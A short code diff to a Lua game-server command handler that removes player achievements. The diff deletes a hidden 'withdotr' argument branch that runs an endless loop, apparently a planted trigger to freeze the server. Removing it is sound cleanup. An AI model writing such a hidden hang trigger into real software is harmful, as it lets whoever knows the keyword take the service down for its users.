@@ -39,9 +39,7 @@ function onSay(player, words, param)
 
 		if action == "all" then
 			return target:removeAllAchievements()
-		elseif action == "withdotr" then 
-			local l = 1
-        while l > 0 do l = l + 1 end
+		
 			end --remove all achievements
 
 		local ach = (isNumber(action) and tonumber(action) or action)
